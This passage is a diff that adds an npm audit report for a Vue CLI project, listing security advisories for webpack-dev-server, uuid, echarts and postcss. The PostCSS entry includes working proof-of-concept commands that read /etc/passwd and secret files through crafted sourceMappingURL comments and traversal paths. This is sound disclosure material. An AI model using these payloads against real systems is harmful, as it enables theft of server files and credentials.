[GHSA-4v9v-hfq4-rm2v](https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v) (CVE-2025-30359) - original vulnerability\n- [GHSA-9jgg-88mc-972h](https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h) (CVE-2025-30360) - prior bypass",
+      "reported_by": null,
+      "title": "webpack-dev-server vulnerable to cross-origin source code exposure on non-HTTPS origins",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-6402"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "webpack-dev-server",
+      "vulnerable_versions": "<=5.2.3",
+      "github_advisory_id": "GHSA-79cf-xcqc-c78w",
+      "recommendation": "Upgrade to version 5.2.4 or later",
+      "patched_versions": ">=5.2.4",
+      "updated": "2026-05-18T13:31:44.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-749"
+      ],
+      "url": "https://github.com/advisories/GHSA-79cf-xcqc-c78w"
+    },
+    "1119440": {
+      "findings": [
+        {
+          "version": "6.0.2",
+          "paths": [
+            ".>@vue/cli-service>copy-webpack-plugin>serialize-javascript"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-qj8w-gfj5-8c6v\n- https://github.com/yahoo/serialize-javascript/commit/f147e90269b58bb6e539cfdf3d0e20d6ad14204b\n- https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-34043\n- https://github.com/yahoo/serialize-javascript/releases/tag/v5.0.0\n- https://github.com/advisories/GHSA-qj8w-gfj5-8c6v",
+      "created": "2026-03-27T18:18:54.000Z",
+      "id": 1119440,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n**What kind of vulnerability is it?**\n\nIt is a **Denial of Service (DoS)** vulnerability caused by CPU exhaustion. When serializing a specially crafted \"array-like\" object (an object that inherits from `Array.prototype` but has a very large `length` property), the process enters an intensive loop that consumes 100% CPU and hangs indefinitely.\n\n**Who is impacted?**\n\nApplications that use `serialize-javascript` to serialize untrusted or user-controlled objects are at risk. While direct exploitation is difficult, it becomes a high-priority threat if the application is also vulnerable to **Prototype Pollution** or handles untrusted data via **YAML Deserialization**, as these could be used to inject the malicious object.\n\n### Patches\n\n**Has the problem been patched?**\n\nYes, the issue has been patched by replacing `instanceof Array` checks with `Array.isArray()` and using `Object.keys()` for sparse array detection.\n\n**What versions should users upgrade to?**\n\nUsers should upgrade to **`v7.0.5`** or later.\n\n### Workarounds\n\n**Is there a way for users to fix or remediate the vulnerability without upgrading?**\n\nThere is no direct code-level workaround within the library itself. However, users can mitigate the risk by:\n\n* Validating and sanitizing all input before passing it to the `serialize()` function.\n* Ensuring the environment is protected against Prototype Pollution.\n* Upgrading to **`v7.0.5`** as soon as possible.\n\n### Acknowledgements\n\nSerialize JavaScript thanks **Tomer Aberbach** (@TomerAberbach) for discovering and privately disclosing this issue.",
+      "reported_by": null,
+      "title": "Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-34043"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "serialize-javascript",
+      "vulnerable_versions": ">=5.0.0 <7.0.5",
+      "github_advisory_id": "GHSA-qj8w-gfj5-8c6v",
+      "recommendation": "Upgrade to version 7.0.5 or later",
+      "patched_versions": ">=7.0.5",
+      "updated": "2026-05-21T18:30:15.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-834"
+      ],
+      "url": "https://github.com/advisories/GHSA-qj8w-gfj5-8c6v"
+    },
+    "1119441": {
+      "findings": [
+        {
+          "version": "8.3.2",
+          "paths": [
+            ".>@vue/cli-service>webpack-dev-server>sockjs>uuid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1119441,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41907"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<11.1.1",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 11.1.1 or later",
+      "patched_versions": ">=11.1.1",
+      "updated": "2026-05-21T18:25:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    },
+    "1121087": {
+      "findings": [
+        {
+          "version": "4.15.2",
+          "paths": [
+            ".>@vue/cli-service>webpack-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-mx8g-39q3-5c79\n- https://nvd.nist.gov/vuln/detail/CVE-2026-9595\n- https://github.com/facebook/create-react-app/pull/7444\n- https://github.com/webpack/webpack-dev-server/pull/4316\n- https://github.com/vuejs/vue-cli/commit/72ba7505aff2a8314e82aa5082379a77504a1fcb\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-mx8g-39q3-5c79",
+      "created": "2026-06-17T18:13:31.000Z",
+      "id": 1121087,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen a user-configured proxy on `webpack-dev-server` has a broad context (e.g. `/`) and `ws: true`, it also intercepts the dev server's own HMR WebSocket and forwards it to the proxy target. This leaks the browser's cookies and `Origin` header to the backend, bypasses the dev server's Host/Origin validation, and corrupts the HMR socket (both HMR and the proxy end up writing to the same socket).\n\n### Patches\n\nFixed in `webpack-dev-server` 5.2.5.\n\n### Workarounds\n\nScope user-defined proxy `context` to specific paths instead of `/`, or omit `ws: true` from the proxy entry when WebSocket forwarding is not required.",
+      "reported_by": null,
+      "title": "webpack-dev-server vulnerable to HMR WebSocket interception via permissive user proxies",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-9595"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "webpack-dev-server",
+      "vulnerable_versions": "<5.2.5",
+      "github_advisory_id": "GHSA-mx8g-39q3-5c79",
+      "recommendation": "Upgrade to version 5.2.5 or later",
+      "patched_versions": ">=5.2.5",
+      "updated": "2026-06-17T18:13:33.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-346",
+        "CWE-441"
+      ],
+      "url": "https://github.com/advisories/GHSA-mx8g-39q3-5c79"
+    },
+    "1122144": {
+      "findings": [
+        {
+          "version": "5.5.1",
+          "paths": [
+            ".>echarts"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-45249\n- https://github.com/apache/echarts/pull/21608\n- https://echarts.apache.org/en/option.html#series-lines\n- https://echarts.apache.org/handbook/en/best-practices/security/#passing_raw_html_safely\n- https://lists.apache.org/thread/1g6xk7gd9vg1c6zyqqt2lnko10zomc3o\n- http://www.openwall.com/lists/oss-security/2026/05/23/4\n- https://github.com/apache/echarts/commit/1e39b00eedda0e4a0b048e099c0e13ce7149d90f\n- https://github.com/advisories/GHSA-fgmj-fm8m-jvvx",
+      "created": "2026-05-26T13:30:40.000Z",
+      "id": 1122144,
+      "npm_advisory_id": null,
+      "overview": "A cross-site scripting (XSS) vulnerability exists in Apache ECharts in the Lines series tooltip rendering logic.\n\nThis issue affects Apache ECharts: from before 6.1.0.\n\nIn versions prior to 6.1.0, if both Lines series and tooltip are used, and no user-specified tooltip.formatter is provided, and series.data[i].name is specified, raw HTML string series.data[i].name can be rendered through innerHTML sink into tooltip content. Although tooltip is allowed to accept user-provided raw HTML via a custom tooltip.formatter, the built-in tooltip formatters conventionally perform HTML escaping automatically. This case breaks that convention and may unexpectedly lead to script execution when tooltips are displayed.\n\n\nUsers are recommended to upgrade to version 6.1.0 if using the Lines series in this way, which fixes the issue.",
+      "reported_by": null,
+      "title": "Apache ECharts has a cross-site scripting (XSS) vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-45249"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "echarts",
+      "vulnerable_versions": "<6.1.0",
+      "github_advisory_id": "GHSA-fgmj-fm8m-jvvx",
+      "recommendation": "Upgrade to version 6.1.0 or later",
+      "patched_versions": ">=6.1.0",
+      "updated": "2026-06-30T16:55:26.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-fgmj-fm8m-jvvx"
+    },
+    "1123965": {
+      "findings": [
+        {
+          "version": "4.15.2",
+          "paths": [
+            ".>@vue/cli-service>webpack-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-f5vj-f2hx-8m93\n- https://nvd.nist.gov/vuln/detail/CVE-2026-14620\n- https://github.com/webpack/webpack-dev-server/pull/5698\n- https://github.com/webpack/webpack-dev-server/commit/80cd9eea54975fe632a518d8bd902a260f374e7c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/webpack/webpack-dev-server/releases/tag/v5.2.6\n- https://github.com/advisories/GHSA-f5vj-f2hx-8m93",
+      "created": "2026-07-20T22:01:56.000Z",
+      "id": 1123965,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe internal `/webpack-dev-server/open-editor` and `/webpack-dev-server/invalidate` endpoints perform state-changing actions on any `GET` request, without verifying that the request originated from the dev server's own page. Any website a developer visits while the dev server is running can trigger them cross-origin with no interaction beyond the visit.\n\nAn attacker can open an arbitrary existing local file in the developer's editor, including files outside the project root (e.g. `~/.ssh/config`). The file's contents are not returned to the attacker. Repeated requests can also spawn editor processes and force recompilations, degrading the developer's machine.\n\n### Patches\n\nFixed in `webpack-dev-server` 5.2.6 by rejecting cross-site requests to the `/webpack-dev-server/open-editor` and `/webpack-dev-server/invalidate` endpoints (see [PR #5698](https://github.com/webpack/webpack-dev-server/pull/5698)).\n\n### Workarounds\n\nNone",
+      "reported_by": null,
+      "title": "webpack-dev-server vulnerable to cross-site request forgery via internal developer endpoints",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-14620"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "webpack-dev-server",
+      "vulnerable_versions": "<=5.2.5",
+      "github_advisory_id": "GHSA-f5vj-f2hx-8m93",
+      "recommendation": "Upgrade to version 5.2.6 or later",
+      "patched_versions": ">=5.2.6",
+      "updated": "2026-07-20T22:02:59.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-352",
+        "CWE-749"
+      ],
+      "url": "https://github.com/advisories/GHSA-f5vj-f2hx-8m93"
+    },
+    "1123966": {
+      "findings": [
+        {
+          "version": "4.15.2",
+          "paths": [
+            ".>@vue/cli-service>webpack-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-m28w-2pqf-7qgj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-14631\n- https://github.com/webpack/webpack-dev-server/pull/5699\n- https://github.com/webpack/webpack-dev-server/commit/f21ed0f44aceb6132abb591ee8b60d770b6e489f\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-m28w-2pqf-7qgj",
+      "created": "2026-07-20T22:02:31.000Z",
+      "id": 1123966,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nAn unauthenticated peer that can reach the `webpack-dev-server` process can terminate it by sending either a normal HTTP request with a malformed `Host` header, or a WebSocket upgrade to the default `/ws` endpoint with a malformed `Origin` header. The malformed header triggers an uncaught exception in the host-validation path and crashes the dev server process.\n\n### Patches\n\nFixed in `webpack-dev-server` 5.2.6 by treating malformed `Host` and `Origin` header values as invalid rather than throwing (see [PR #5699](https://github.com/webpack/webpack-dev-server/pull/5699)).\n\n### Workarounds\n\nKeep the dev server bound to `localhost` (the default) and do not expose it to untrusted networks.",
+      "reported_by": null,
+      "title": "webpack-dev-server vulnerable to denial of service via a malformed Host or Origin header",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-14631"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "webpack-dev-server",
+      "vulnerable_versions": "<=5.2.5",
+      "github_advisory_id": "GHSA-m28w-2pqf-7qgj",
+      "recommendation": "Upgrade to version 5.2.6 or later",
+      "patched_versions": ">=5.2.6",
+      "updated": "2026-07-20T22:02:58.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-m28w-2pqf-7qgj"
+    },
+    "1124252": {
+      "findings": [
+        {
+          "version": "7.0.39",
+          "paths": [
+            ".>@vue/cli-service>@vue/component-compiler-utils>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-6g55-p6wh-862q\n- https://github.com/postcss/postcss/commit/aaec7b78b3ce2792585b4b300ef1bd5dd5b3e8ad\n- https://github.com/postcss/postcss/commit/c64b7488d2731dfa16213739b42c34faf5a9eba3\n- https://github.com/postcss/postcss/releases/tag/8.5.12\n- https://github.com/advisories/GHSA-6g55-p6wh-862q",
+      "created": "2026-07-23T15:06:16.000Z",
+      "id": 1124252,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nPostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).\n\n## Details\n\nThe dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.\n\n`Input` constructor (`lib/input.js:70-77`):\n\n```js\nif (pathAvailable && sourceMapAvailable) {\n  let map = new PreviousMap(this.css, opts)\n  if (map.text) {\n    this.map = map\n    let file = map.consumer().file\n    if (!this.file && file) this.file = this.mapResolve(file)\n  }\n}\n```\n\n`PreviousMap` constructor (`lib/previous-map.js:17-29`):\n\n```js\nconstructor(css, opts) {\n  if (opts.map === false) return\n  this.loadAnnotation(css)\n  this.inline = this.startWith(this.annotation, 'data:')\n\n  let prev = opts.map ? opts.map.prev : undefined\n  let text = this.loadMap(opts.from, prev)\n  ...\n}\n```\n\nNote `opts.map === false` is the only short-circuit. With default options (`opts.map === undefined`), the rest of the constructor — including the filesystem read — executes.\n\n`loadAnnotation` (`lib/previous-map.js:72-84`) extracts the URL **without sanitisation**:\n\n```js\nloadAnnotation(css) {\n  let comments = css.match(/\\/\\*\\s*# sourceMappingURL=/g)\n  if (!comments) return\n  let start = css.lastIndexOf(comments.pop())\n  let end = css.indexOf('*/', start)\n  if (start > -1 && end > -1) {\n    this.annotation = this.getAnnotationURL(css.substring(start, end))\n  }\n}\n```\n\n`getAnnotationURL` (`lib/previous-map.js:59-61`) only strips the `/*# sourceMappingURL=` prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.\n\n`loadMap` (`lib/previous-map.js:124-128`) — when `prev` is absent and the annotation is not an inline `data:` URI:\n\n```js\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)\n  return this.loadFile(map)\n}\n```\n\n* If `opts.from` is unset, `file` is undefined and the raw attacker-supplied path (e.g. `/etc/passwd`) is used directly.\n* If `opts.from` is set, `path.join(dirname(file), attackerPath)` is used. `path.join` does **not** block `..` segments, so `../../../../../etc/passwd` resolves outside the intended directory.\n\n`loadFile` (`lib/previous-map.js:86-92`) is the sink:\n\n```js\nloadFile(path) {\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\n\nThe bytes are stored in `this.text`. `Input` immediately invokes `map.consumer()` (`lib/input.js:74`), which constructs a `SourceMapConsumer` (`lib/previous-map.js:33`). When the file is not valid source-map JSON (the common case), `source-map-js` calls `JSON.parse`, and V8's `SyntaxError` message embeds the first ~10 bytes of the file content:\n\n```\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThis error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the attacker.\n\nTrust-boundary analysis:\n* Attacker controls: CSS input passed to `postcss().process(css, opts?)`.\n* Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, `/etc/passwd`, `/proc/self/environ`, etc.\n* No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (`startWith(annotation, 'data:')`) routes inline URIs to `decodeInline`; everything else hits `loadFile`.\n\nPrimitives obtained:\n* (a) **Arbitrary file read** — bytes loaded into Node memory.\n* (b) **Information disclosure** — first ~10 bytes leaked via `JSON.parse` `SyntaxError` message.\n* (c) **File-existence oracle** — non-existent paths return silently from `loadFile` (`existsSync` is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.\n* (d) **DoS primitive** — directing the read at `/dev/zero`, very large files, or device files can stall or crash the process.\n\n## PoC\n\nAll commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.\n\n**Vector 1 — Absolute path, default options (no `from`, no `map`):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  try { p().process(\"a{color:red}\\n/*# sourceMappingURL=/etc/passwd */\"); } \\\n  catch(e){console.log(e.message)}'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThe first 10 bytes of `/etc/passwd` (`root:x:0:0`) are leaked.\n\n**Vector 2 — Relative `..` traversal with `opts.from` set (simulates a build pipeline that pins `from` to the source file):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  p().process(\"a{color:red}\\n/*# sourceMappingURL=../../../../../etc/passwd */\", \\\n              {from:\"/var/www/html/styles/main.css\", map:{inline:false}}) \\\n   .catch(e=>console.log(e.message))'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\n`path.join('/var/www/html/styles', '../../../../../etc/passwd')` resolves to `/etc/passwd`.\n\n**Vector 3 — File-existence oracle:**\n\n```bash\n# Existing non-JSON file → throws (file confirmed to exist)\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/etc/passwd */\")'\nSyntaxError: Unexpected token 'r', \"root:x:0:0\"... is not valid JSON\n\n# Non-existent file → returns silently (file confirmed absent)\n$ node -e 'r=require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/no/such/file */\"); console.log(\"ok\")'\nok\n```\n\n**Vector 4 — Custom file-content leak:**\n\n```bash\n$ printf 'API_KEY=sk-secret-12345\\n' > /tmp/server-secret.env\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/tmp/server-secret.env */\")' 2>&1 | head -1\nSyntaxError: Unexpected token 'A', \"API_KEY=sk\"... is not valid JSON\n```\n\nThe first 10 bytes of `/tmp/server-secret.env` (`API_KEY=sk`) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.\n\n**Filesystem-call trace** (proves the read happens with no opts at all):\n\n```js\nconst fs = require('fs');\nconst orig = fs.readFileSync;\nfs.readFileSync = function(p){\n  if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);\n  return orig.apply(this, arguments);\n};\nrequire('postcss')().process('a{}\\n/*# sourceMappingURL=/etc/hostname */');\n// → [FILE READ]: /etc/hostname\n// → SyntaxError: Unexpected token 'D', \"Debian-tri\"... is not valid JSON\n```\n\n## Impact\n\n* **Arbitrary file read** of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack `postcss-loader`, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.\n* **Confidentiality leak** of the first ~10 bytes of the targeted file via `JSON.parse` `SyntaxError`. This is enough to recover SSH-key headers, environment-variable prefixes (`API_KEY=sk…`), `/etc/passwd` records, the start of `/proc/self/environ`, and other high-value secrets, and to fingerprint the host (`Debian-tri…` from `/etc/hostname`).\n* **File-existence oracle** with three distinguishable response states (silent success, `JSON.parse` error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.\n* **DoS** by targeting `/dev/zero`, `/proc/kcore`, very large files, or named pipes — `readFileSync` is a synchronous, unbounded read.\n* **Default-on**: triggered with `postcss().process(css)` and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose `{ map: false }`.\n\n## Recommended Fix\n\nThe root cause is that `loadFile` accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:\n\n1. **Refuse traversal/absolute paths in `loadMap`** (defence-in-depth):\n\n   ```js\n   // lib/previous-map.js\n   loadMap(file, prev) {\n     if (prev === false) return false\n     if (prev) { /* unchanged */ }\n     else if (this.inline) {\n       return this.decodeInline(this.annotation)\n     } else if (this.annotation) {\n       let annotation = this.annotation\n       // Reject schemes (other than data:, handled above) and absolute paths.\n       if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(annotation)) return\n       if (require('path').isAbsolute(annotation)) return\n       if (!file) return  // No base path → cannot safely resolve.\n       const base = require('path').resolve(require('path').dirname(file))\n       const resolved = require('path').resolve(base, annotation)\n       // Refuse anything that escapes the base directory.\n       if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {\n         return\n       }\n       return this.loadFile(resolved)\n     }\n   }\n   ```\n\n2. **Require explicit opt-in to follow on-disk source-map annotations**: gate the `loadFile(map)` call in `loadMap` behind an option such as `opts.map.annotation === true` or `opts.map.followAnnotation === true`. Today, the only way to opt out is `{ map: false }`, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.\n\nA user-facing changelog entry should warn that `postcss().process(untrustedCss)` previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.",
+      "reported_by": null,
+      "title": "PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-45623"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.11",
+      "github_advisory_id": "GHSA-6g55-p6wh-862q",
+      "recommendation": "Upgrade to version 8.5.12 or later",
+      "patched_versions": ">=8.5.12",
+      "updated": "2026-07-23T15:06:17.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-6g55-p6wh-862q"
+    },
+    "1130709": {
+      "findings": [
+        {
+          "version": "7.0.39",
+          "paths": [
+            ".>@vue/cli-service>@vue/component-compiler-utils>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp\n- https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8\n- https://github.com/postcss/postcss/releases/tag/8.5.19\n- https://github.com/advisories/GHSA-fxqj-rqcc-2cmp",
+      "created": "2026-08-03T17:11:39.000Z",
+      "id": 1130709,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\n\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\n\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\n\n```js\n// lib/previous-map.js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (cssFile) {                       // guard runs ONLY when `from` is set\n      let relativePath = relative(dirname(cssFile), path)\n      if (relativePath === '..' ||\n          relativePath.startsWith('..' + sep) ||\n          isAbsolute(relativePath)) {\n        return undefined\n      }\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()   // sink\n  }\n}\n\n// loadMap(): untrusted annotation path, trusted=false; file === opts.from\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL\n  let unknown = this.loadFile(map, file, false)  // file 